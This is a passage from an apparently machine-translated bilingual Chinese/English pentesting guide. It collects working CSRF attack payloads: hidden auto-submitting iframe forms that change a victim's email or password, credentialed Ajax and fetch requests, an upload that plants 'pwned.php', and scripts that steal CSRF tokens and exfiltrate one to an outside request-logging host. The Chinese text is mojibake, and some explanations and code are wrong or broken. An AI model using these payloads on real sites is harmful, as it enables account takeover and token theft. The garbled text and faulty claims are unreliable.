é€šè¿‡å®æ–½è¿™äº›æªæ–½ï¼ŒWebå¼€å‘äººå‘˜å¯ä»¥å‡è½»é€šè¿‡iframeè¿›è¡Œçš„CSRFæ”»å‡»çš„é£é™©ï¼Œä¿æŠ¤ç”¨æˆ·çš„æ•°æ®å’Œéšç§ã€‚
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST è¯·æ±‚**

Ajax æ˜¯ä¸€ç§ç”¨äºåœ¨åå°å‘é€ HTTP è¯·æ±‚çš„æŠ€æœ¯ã€‚é€šè¿‡ä½¿ç”¨ Ajaxï¼Œå¯ä»¥åœ¨ä¸åˆ·æ–°æ•´ä¸ªé¡µé¢çš„æƒ…å†µä¸‹ï¼Œå‘æœåŠ¡å™¨å‘é€ POST è¯·æ±‚å¹¶æ¥æ”¶å“åº”ã€‚

åœ¨è¿›è¡Œ CSRF æ”»å‡»æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å—å®³è€…çš„èº«ä»½å‘é€æ¶æ„çš„ Ajax POST è¯·æ±‚ã€‚è¿™ç§æ”»å‡»æ–¹å¼è¢«ç§°ä¸º CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰ã€‚

æ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨æ¶æ„ç½‘ç«™ä¸Šæ”¾ç½®ä¸€ä¸ªé’“é±¼è¡¨å•ï¼Œæˆ–è€…é€šè¿‡å‘é€åŒ…å«æ¶æ„ä»£ç çš„ç”µå­é‚®ä»¶ï¼Œå¼•è¯±å—å®³è€…ç‚¹å‡»æ¶æ„é“¾æ¥ã€‚å½“å—å®³è€…åœ¨ç™»å½•çŠ¶æ€ä¸‹è®¿é—®æ¶æ„ç½‘ç«™æˆ–ç‚¹å‡»æ¶æ„é“¾æ¥æ—¶ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å‘é€åŒ…å«å—å®³è€…èº«ä»½éªŒè¯å‡­æ®çš„ Ajax POST è¯·æ±‚ã€‚

ä¸ºäº†é˜²æ­¢ CSRF æ”»å‡»ï¼Œå¼€å‘äººå‘˜åº”è¯¥å®æ–½é€‚å½“çš„é˜²å¾¡æªæ–½ï¼Œå¦‚ä½¿ç”¨ CSRF ä»¤ç‰Œã€æ£€æŸ¥ Referer å¤´éƒ¨ç­‰ã€‚
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST è¯·æ±‚

When a web application uses the `multipart/form-data` encoding type for a POST request, it means that the data being sent is in a format that allows for the transmission of binary and textual data together. This encoding type is commonly used when uploading files through a web form.

å½“ä¸€ä¸ª Web åº”ç”¨ç¨‹åºä½¿ç”¨ `multipart/form-data` ç¼–ç ç±»å‹è¿›è¡Œ POST è¯·æ±‚æ—¶ï¼Œæ„å‘³ç€å‘é€çš„æ•°æ®ä»¥ä¸€ç§å…è®¸äºŒè¿›åˆ¶å’Œæ–‡æœ¬æ•°æ®ä¸€èµ·ä¼ è¾“çš„æ ¼å¼è¿›è¡Œç¼–ç ã€‚è¿™ç§ç¼–ç ç±»å‹é€šå¸¸åœ¨é€šè¿‡ Web è¡¨å•ä¸Šä¼ æ–‡ä»¶æ—¶ä½¿ç”¨ã€‚

In a `multipart/form-data` POST request, the data is divided into multiple parts, each with its own set of headers and a unique identifier. Each part contains a specific piece of data, such as a file or a form field value.

åœ¨ `multipart/form-data` POST è¯·æ±‚ä¸­ï¼Œæ•°æ®è¢«åˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½æœ‰è‡ªå·±çš„å¤´éƒ¨å’Œå”¯ä¸€æ ‡è¯†ç¬¦ã€‚æ¯ä¸ªéƒ¨åˆ†åŒ…å«ç‰¹å®šçš„æ•°æ®ï¼Œä¾‹å¦‚æ–‡ä»¶æˆ–è¡¨å•å­—æ®µçš„å€¼ã€‚

The request body starts with a boundary string, which is a unique identifier that separates the different parts of the request. Each part is then preceded by a set of headers that provide information about the data being sent.

è¯·æ±‚ä½“ä»¥è¾¹ç•Œå­—ç¬¦ä¸²å¼€å§‹ï¼Œè¯¥å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦ï¼Œç”¨äºåˆ†éš”è¯·æ±‚çš„ä¸åŒéƒ¨åˆ†ã€‚ç„¶åï¼Œæ¯ä¸ªéƒ¨åˆ†å‰é¢éƒ½æœ‰ä¸€ç»„å¤´éƒ¨ï¼Œæä¾›æœ‰å…³å‘é€çš„æ•°æ®çš„ä¿¡æ¯ã€‚

For example, a `multipart/form-data` POST request may include a part for a file upload, with the `Content-Disposition` header specifying the name of the file and the `Content-Type` header indicating the type of file being uploaded.

ä¾‹å¦‚ï¼Œ`multipart/form-data` POST è¯·æ±‚å¯èƒ½åŒ…å«ä¸€ä¸ªç”¨äºæ–‡ä»¶ä¸Šä¼ çš„éƒ¨åˆ†ï¼Œå…¶ä¸­ `Content-Disposition` å¤´éƒ¨æŒ‡å®šæ–‡ä»¶çš„åç§°ï¼Œè€Œ `Content-Type` å¤´éƒ¨æŒ‡ç¤ºæ­£åœ¨ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ã€‚

When performing a penetration test, it is important to understand how the web application handles `multipart/form-data` requests, as this can help identify potential vulnerabilities such as Cross-Site Request Forgery (CSRF).

åœ¨è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œäº†è§£ Web åº”ç”¨ç¨‹åºå¦‚ä½•å¤„ç† `multipart/form-data` è¯·æ±‚éå¸¸é‡è¦ï¼Œå› ä¸ºè¿™å¯ä»¥å¸®åŠ©è¯†åˆ«æ½œåœ¨çš„æ¼æ´ï¼Œå¦‚è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰ã€‚

By crafting malicious `multipart/form-data` requests, an attacker may be able to trick a user into unknowingly performing actions on the web application, leading to unauthorized access or data manipulation.

é€šè¿‡æ„é€ æ¶æ„çš„ `multipart/form-data` è¯·æ±‚ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæˆåŠŸæ¬ºéª—ç”¨æˆ·åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å¯¹ Web åº”ç”¨ç¨‹åºæ‰§è¡Œæ“ä½œï¼Œä»è€Œå¯¼è‡´æœªç»æˆæƒçš„è®¿é—®æˆ–æ•°æ®ç¯¡æ”¹ã€‚
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POSTè¯·æ±‚ v2

In this section, we will discuss the second version of the multipart/form-data POST request. This type of request is commonly used to upload files or submit form data that includes binary content.

#### Understanding the Request

The multipart/form-data POST request consists of multiple parts, each containing a separate piece of data. Each part is identified by a unique boundary string, which is specified in the request headers.

#### Building the Request

To build a multipart/form-data POST request, follow these steps:

1. Set the Content-Type header to "multipart/form-data" and include the boundary string.
2. Create each part of the request by specifying the Content-Disposition header, which includes the name and filename (if applicable) of the data being sent.
3. Include any additional headers required for each part, such as Content-Type for file uploads.
4. Add the data for each part, including any binary content.
5. Close the request body by adding the boundary string followed by "--" to indicate the end of the request.

#### Example Request

Here is an example of a multipart/form-data POST request:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="username"

john.doe
-----------------------------1234567890
Content-Disposition: form-data; name="profile_picture"; filename="picture.jpg"
Content-Type: image/jpeg

[Binary image data]
-----------------------------1234567890--
```

In this example, the request includes two parts: one for the "username" field and another for the "profile_picture" file upload.

#### Conclusion

The multipart/form-data POST request is a versatile method for sending data that includes binary content. Understanding how to build and manipulate this type of request is essential for performing various web application attacks, such as CSRF (Cross-Site Request Forgery).
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### åœ¨ iframe ä¸­å‘é€è¡¨å• POST è¯·æ±‚

When an HTML form is submitted, the browser sends a POST request to the server. This can be done within an iframe as well. However, due to the same-origin policy, the browser will only allow the form to be submitted if the form and the iframe have the same origin.

å½“ HTML è¡¨å•è¢«æäº¤æ—¶ï¼Œæµè§ˆå™¨ä¼šå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ª POST è¯·æ±‚ã€‚è¿™ä¹Ÿå¯ä»¥åœ¨ iframe ä¸­å®Œæˆã€‚ç„¶è€Œï¼Œç”±äºåŒæºç­–ç•¥çš„é™åˆ¶ï¼Œæµè§ˆå™¨åªå…è®¸åœ¨è¡¨å•å’Œ iframe å…·æœ‰ç›¸åŒæºçš„æƒ…å†µä¸‹æäº¤è¡¨å•ã€‚

To achieve this, you can create an iframe with the same origin as the form's target URL. Then, you can dynamically create a form within the iframe and submit it programmatically.

ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæ‚¨å¯ä»¥åˆ›å»ºä¸€ä¸ªä¸è¡¨å•ç›®æ ‡ URL å…·æœ‰ç›¸åŒæºçš„ iframeã€‚ç„¶åï¼Œæ‚¨å¯ä»¥åœ¨ iframe ä¸­åŠ¨æ€åˆ›å»ºä¸€ä¸ªè¡¨å•ï¼Œå¹¶ä»¥ç¼–ç¨‹æ–¹å¼æäº¤å®ƒã€‚

Here's an example of how you can accomplish this using JavaScript:

ä»¥ä¸‹æ˜¯ä½¿ç”¨ JavaScript å®ç°æ­¤åŠŸèƒ½çš„ç¤ºä¾‹ï¼š

```html
<iframe id="myFrame" src="https://example.com"></iframe>

<script>
  // Get the iframe element
  var iframe = document.getElementById('myFrame');

  // Create a form element
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://example.com/submit';

  // Create form fields
  var input1 = document.createElement('input');
  input1.type = 'hidden';
  input1.name = 'username';
  input1.value = 'admin';

  var input2 = document.createElement('input');
  input2.type = 'hidden';
  input2.name = 'password';
  input2.value = 'password123';

  // Append form fields to the form
  form.appendChild(input1);
  form.appendChild(input2);

  // Append the form to the iframe
  iframe.contentDocument.body.appendChild(form);

  // Submit the form
  form.submit();
</script>
```

In this example, an iframe with the id "myFrame" is created and its source is set to "https://example.com". Then, a form is dynamically created within the iframe and populated with hidden input fields. Finally, the form is submitted programmatically.

åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œåˆ›å»ºäº†ä¸€ä¸ª id ä¸º "myFrame" çš„ iframeï¼Œå¹¶å°†å…¶æºè®¾ç½®ä¸º "https://example.com"ã€‚ç„¶åï¼Œåœ¨ iframe ä¸­åŠ¨æ€åˆ›å»ºä¸€ä¸ªè¡¨å•ï¼Œå¹¶å¡«å……éšè—çš„è¾“å…¥å­—æ®µã€‚æœ€åï¼Œä»¥ç¼–ç¨‹æ–¹å¼æäº¤è¡¨å•ã€‚

This technique can be used for various purposes, including performing Cross-Site Request Forgery (CSRF) attacks. It is important to note that CSRF attacks are illegal and unethical unless performed with proper authorization and for legitimate security testing purposes.

è¿™ç§æŠ€æœ¯å¯ä»¥ç”¨äºå„ç§ç›®çš„ï¼ŒåŒ…æ‹¬æ‰§è¡Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ”»å‡»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé™¤éç»è¿‡é€‚å½“æˆæƒå¹¶ç”¨äºåˆæ³•çš„å®‰å…¨æµ‹è¯•ç›®çš„ï¼Œå¦åˆ™æ‰§è¡Œ CSRF æ”»å‡»æ˜¯éæ³•å’Œä¸é“å¾·çš„ã€‚
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **çªƒå–CSRFä»¤ç‰Œå¹¶å‘é€POSTè¯·æ±‚**

In this technique, we will steal the CSRF token from a legitimate user and use it to craft a malicious POST request. This attack is known as Cross-Site Request Forgery (CSRF).

åœ¨è¿™ä¸ªæŠ€æœ¯ä¸­ï¼Œæˆ‘ä»¬å°†çªƒå–åˆæ³•ç”¨æˆ·çš„CSRFä»¤ç‰Œï¼Œå¹¶ä½¿ç”¨å®ƒæ¥æ„é€ æ¶æ„çš„POSTè¯·æ±‚ã€‚è¿™ç§æ”»å‡»è¢«ç§°ä¸ºè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰ã€‚

1. **Identify the target**: First, we need to identify the target website that is vulnerable to CSRF attacks.

   **è¯†åˆ«ç›®æ ‡**ï¼šé¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦è¯†åˆ«æ˜“å—CSRFæ”»å‡»çš„ç›®æ ‡ç½‘ç«™ã€‚

2. **Analyze the website**: Next, we analyze the website to find out how the CSRF token is generated and included in the requests.

   **åˆ†æç½‘ç«™**ï¼šæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬åˆ†æç½‘ç«™ï¼Œæ‰¾å‡ºCSRFä»¤ç‰Œæ˜¯å¦‚ä½•ç”Ÿæˆå¹¶åŒ…å«åœ¨è¯·æ±‚ä¸­çš„ã€‚

3. **Steal the CSRF token**: We can steal the CSRF token by tricking a legitimate user into visiting a malicious website or by exploiting a vulnerability on the target website.

   **çªƒå–CSRFä»¤ç‰Œ**ï¼šæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯±ä½¿åˆæ³•ç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™æˆ–åˆ©ç”¨ç›®æ ‡ç½‘ç«™ä¸Šçš„æ¼æ´æ¥çªƒå–CSRFä»¤ç‰Œã€‚

4. **Craft a malicious POST request**: Once we have the CSRF token, we can craft a malicious POST request with the stolen token and send it to the target website.

   **æ„é€ æ¶æ„çš„POSTè¯·æ±‚**ï¼šä¸€æ—¦æˆ‘ä»¬è·å¾—äº†CSRFä»¤ç‰Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨çªƒå–çš„ä»¤ç‰Œæ„é€ ä¸€ä¸ªæ¶æ„çš„POSTè¯·æ±‚ï¼Œå¹¶å°†å…¶å‘é€åˆ°ç›®æ ‡ç½‘ç«™ã€‚

5. **Exploit the vulnerability**: If the target website does not have proper CSRF protection in place, it will process the malicious POST request and perform the desired action on behalf of the legitimate user.

   **åˆ©ç”¨æ¼æ´**ï¼šå¦‚æœç›®æ ‡ç½‘ç«™æ²¡æœ‰é€‚å½“çš„CSRFä¿æŠ¤æªæ–½ï¼Œå®ƒå°†å¤„ç†æ¶æ„çš„POSTè¯·æ±‚ï¼Œå¹¶ä»£è¡¨åˆæ³•ç”¨æˆ·æ‰§è¡Œæ‰€éœ€çš„æ“ä½œã€‚

It is important to note that CSRF attacks can have serious consequences, such as unauthorized actions performed on behalf of the user or data leakage. Therefore, it is crucial for web developers to implement proper CSRF protection mechanisms to prevent such attacks.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒCSRFæ”»å‡»å¯èƒ½ä¼šäº§ç”Ÿä¸¥é‡åæœï¼Œä¾‹å¦‚ä»¥ç”¨æˆ·åä¹‰æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œæˆ–æ•°æ®æ³„éœ²ã€‚å› æ­¤ï¼Œå¯¹äºWebå¼€å‘äººå‘˜æ¥è¯´ï¼Œå®æ–½é€‚å½“çš„CSRFä¿æŠ¤æœºåˆ¶ä»¥é˜²æ­¢æ­¤ç±»æ”»å‡»è‡³å…³é‡è¦ã€‚
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **çªƒå–CSRFä»¤ç‰Œå¹¶ä½¿ç”¨iframeã€è¡¨å•å’ŒAjaxå‘é€Postè¯·æ±‚**

In this technique, we will exploit the vulnerability of Cross-Site Request Forgery (CSRF) by stealing the CSRF token and using it to send a malicious POST request. We will accomplish this by utilizing an iframe, a form, and Ajax.

åœ¨è¿™ä¸ªæŠ€æœ¯ä¸­ï¼Œæˆ‘ä»¬å°†åˆ©ç”¨è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰çš„æ¼æ´ï¼Œçªƒå–CSRFä»¤ç‰Œå¹¶ä½¿ç”¨å®ƒå‘é€æ¶æ„çš„POSTè¯·æ±‚ã€‚æˆ‘ä»¬å°†é€šè¿‡ä½¿ç”¨iframeã€è¡¨å•å’ŒAjaxæ¥å®ç°è¿™ä¸€ç›®æ ‡ã€‚

#### **Step 1: Stealing the CSRF Token**

#### **æ­¥éª¤1ï¼šçªƒå–CSRFä»¤ç‰Œ**

To begin, we need to find a way to steal the CSRF token from the target website. This can be done by analyzing the website's source code or using browser developer tools. Once we have identified the location of the CSRF token, we can extract it using JavaScript.

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥çªƒå–ç›®æ ‡ç½‘ç«™çš„CSRFä»¤ç‰Œã€‚è¿™å¯ä»¥é€šè¿‡åˆ†æç½‘ç«™çš„æºä»£ç æˆ–ä½¿ç”¨æµè§ˆå™¨å¼€å‘è€…å·¥å…·æ¥å®Œæˆã€‚ä¸€æ—¦æˆ‘ä»¬ç¡®å®šäº†CSRFä»¤ç‰Œçš„ä½ç½®ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨JavaScriptæ¥æå–å®ƒã€‚

#### **Step 2: Creating an iframe**

#### **æ­¥éª¤2ï¼šåˆ›å»ºä¸€ä¸ªiframe**

Next, we will create an iframe element in our malicious webpage. This iframe will be used to load the target website's page that contains the form we want to submit. By loading the target website within our iframe, we can manipulate the form and submit it without the user's knowledge.

æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†åœ¨æ¶æ„ç½‘é¡µä¸­åˆ›å»ºä¸€ä¸ªiframeå…ƒç´ ã€‚è¿™ä¸ªiframeå°†ç”¨äºåŠ è½½åŒ…å«æˆ‘ä»¬æƒ³è¦æäº¤çš„è¡¨å•çš„ç›®æ ‡ç½‘ç«™é¡µé¢ã€‚é€šè¿‡åœ¨æˆ‘ä»¬çš„iframeä¸­åŠ è½½ç›®æ ‡ç½‘ç«™ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ“çºµè¡¨å•å¹¶æäº¤å®ƒã€‚

#### **Step 3: Manipulating the form**

#### **æ­¥éª¤3ï¼šæ“çºµè¡¨å•**

Once the target website's page is loaded within our iframe, we can use JavaScript to manipulate the form. We will set the form's action attribute to the URL where we want to send the malicious POST request. We will also set the form's method attribute to "POST" and include any necessary input fields with their corresponding values.

ä¸€æ—¦ç›®æ ‡ç½‘ç«™çš„é¡µé¢åœ¨æˆ‘ä»¬çš„iframeä¸­åŠ è½½å®Œæˆï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨JavaScriptæ¥æ“çºµè¡¨å•ã€‚æˆ‘ä»¬å°†æŠŠè¡¨å•çš„actionå±æ€§è®¾ç½®ä¸ºæˆ‘ä»¬æƒ³è¦å‘é€æ¶æ„POSTè¯·æ±‚çš„URLã€‚æˆ‘ä»¬è¿˜å°†æŠŠè¡¨å•çš„methodå±æ€§è®¾ç½®ä¸ºâ€œPOSTâ€ï¼Œå¹¶åŒ…å«ä»»ä½•å¿…è¦çš„è¾“å…¥å­—æ®µåŠå…¶ç›¸åº”çš„å€¼ã€‚

#### **Step 4: Sending the POST request**

#### **æ­¥éª¤4ï¼šå‘é€POSTè¯·æ±‚**

Finally, we will use Ajax to send the manipulated form data as a POST request to the target website's server. By doing this, we can bypass any CSRF protection mechanisms that may be in place. The server will process the request as if it came from a legitimate source, allowing us to perform unauthorized actions on behalf of the user.

æœ€åï¼Œæˆ‘ä»¬å°†ä½¿ç”¨Ajaxå°†æ“çºµåçš„è¡¨å•æ•°æ®ä½œä¸ºPOSTè¯·æ±‚å‘é€åˆ°ç›®æ ‡ç½‘ç«™çš„æœåŠ¡å™¨ã€‚é€šè¿‡è¿™æ ·åšï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡å¯èƒ½å­˜åœ¨çš„ä»»ä½•CSRFä¿æŠ¤æœºåˆ¶ã€‚æœåŠ¡å™¨å°†å¤„ç†è¯¥è¯·æ±‚ï¼Œå°±å¥½åƒå®ƒæ¥è‡ªä¸€ä¸ªåˆæ³•çš„æ¥æºï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿä»£è¡¨ç”¨æˆ·æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚

It is important to note that this technique is highly unethical and illegal unless performed with proper authorization during a penetration testing engagement.

éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé™¤éåœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ç»è¿‡é€‚å½“æˆæƒï¼Œå¦åˆ™è¿™ç§æŠ€æœ¯æ˜¯éå¸¸ä¸é“å¾·å’Œéæ³•çš„ã€‚
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **çªƒå–CSRFä»¤ç‰Œå¹¶ä½¿ç”¨iframeå’Œè¡¨å•å‘é€POSTè¯·æ±‚**

To perform a Cross-Site Request Forgery (CSRF) attack, you need to steal the CSRF token from the target website and then use it to send a malicious POST request. One way to achieve this is by utilizing an iframe and a form.

é¦–å…ˆï¼Œä½ éœ€è¦ä»ç›®æ ‡ç½‘ç«™çªƒå–CSRFä»¤ç‰Œï¼Œç„¶åä½¿ç”¨å®ƒå‘é€æ¶æ„çš„POSTè¯·æ±‚æ¥æ‰§è¡Œè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ”»å‡»ã€‚å…¶ä¸­ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨iframeå’Œè¡¨å•ã€‚

1. Create an iframe element in your attacker-controlled website. Set the source of the iframe to the target website's page that contains the CSRF token.

   åœ¨æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ä¸­åˆ›å»ºä¸€ä¸ªiframeå…ƒç´ ã€‚å°†iframeçš„æºè®¾ç½®ä¸ºåŒ…å«CSRFä»¤ç‰Œçš„ç›®æ ‡ç½‘ç«™é¡µé¢ã€‚

   ```html
   <iframe src="https://target-website.com/csrf-page"></iframe>
   ```

2. Use JavaScript to access the content of the iframe and extract the CSRF token.

   ä½¿ç”¨JavaScriptè®¿é—®iframeçš„å†…å®¹å¹¶æå–CSRFä»¤ç‰Œã€‚

   ```javascript
   var iframe = document.getElementsByTagName('iframe')[0];
   var csrfToken = iframe.contentDocument.getElementById('csrf-token').value;
   ```

3. Create a hidden form element in your attacker-controlled website. Set the action attribute of the form to the target website's vulnerable endpoint.

   åœ¨æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ä¸­åˆ›å»ºä¸€ä¸ªéšè—çš„è¡¨å•å…ƒç´ ã€‚å°†è¡¨å•çš„actionå±æ€§è®¾ç½®ä¸ºç›®æ ‡ç½‘ç«™çš„æ˜“å—æ”»å‡»çš„ç«¯ç‚¹ã€‚

   ```html
   <form id="csrf-form" action="https://target-website.com/vulnerable-endpoint" method="POST">
     <input type="hidden" name="csrf-token" value="">
   </form>
   ```

4. Use JavaScript to set the value of the hidden input field to the stolen CSRF token.

   ä½¿ç”¨JavaScriptå°†éšè—è¾“å…¥å­—æ®µçš„å€¼è®¾ç½®ä¸ºçªƒå–çš„CSRFä»¤ç‰Œã€‚

   ```javascript
   var form = document.getElementById('csrf-form');
   form.elements['csrf-token'].value = csrfToken;
   ```

5. Use JavaScript to submit the form automatically.

   ä½¿ç”¨JavaScriptè‡ªåŠ¨æäº¤è¡¨å•ã€‚

   ```javascript
   form.submit();
   ```

By combining the iframe and form techniques, you can steal the CSRF token and send a POST request on behalf of the victim user without their knowledge or consent.

é€šè¿‡ç»“åˆiframeå’Œè¡¨å•æŠ€æœ¯ï¼Œä½ å¯ä»¥åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…æˆ–æœªç»åŒæ„çš„æƒ…å†µä¸‹çªƒå–CSRFä»¤ç‰Œå¹¶ä»£è¡¨å—å®³è€…ç”¨æˆ·å‘é€POSTè¯·æ±‚ã€‚
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **çªƒå–ä»¤ç‰Œå¹¶ä½¿ç”¨2ä¸ªiframeå‘é€**

In this technique, we will steal the CSRF token from the target website and send it to our own server using two iframes. This allows us to bypass the same-origin policy and perform unauthorized actions on behalf of the victim user.

#### **Step 1: Stealing the CSRF token**

To steal the CSRF token, we need to trick the victim into visiting a malicious website controlled by us. This can be done through various methods, such as sending a phishing email or exploiting a vulnerability in the target website.

Once the victim visits our malicious website, we can use JavaScript to extract the CSRF token from the target website's HTML source code. We can then store this token in a variable for later use.

#### **Step 2: Sending the stolen token**

Now that we have the stolen CSRF token, we can send it to our own server using two iframes. The first iframe will be used to make a GET request to the target website's endpoint that requires the CSRF token. We will include the stolen token as a parameter in the URL.

```html
<iframe src="https://www.target-website.com/endpoint?csrf_token=<stolen_token>" style="display:none;"></iframe>
```

The second iframe will be used to make a POST request to the same endpoint, this time including the stolen token in the request body.

```html
<iframe src="https://www.target-website.com/endpoint" style="display:none;">
  <form method="POST">
    <input type="hidden" name="csrf_token" value="<stolen_token>">
  </form>
</iframe>
```

By using two iframes, we ensure that both the GET and POST requests are made, allowing us to successfully perform the CSRF attack.

#### **Step 3: Performing unauthorized actions**

Once the stolen token is sent to our server, we can use it to perform unauthorized actions on behalf of the victim user. This can include changing account settings, making purchases, or performing any other action that the victim user is authorized to do.

It is important to note that this technique relies on the victim being authenticated on the target website. If the victim is not logged in, the CSRF token will not be valid and the attack will fail.

By using this technique, an attacker can exploit CSRF vulnerabilities to gain unauthorized access to user accounts and perform malicious actions. It is important for developers to implement proper CSRF protection mechanisms to prevent such attacks.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

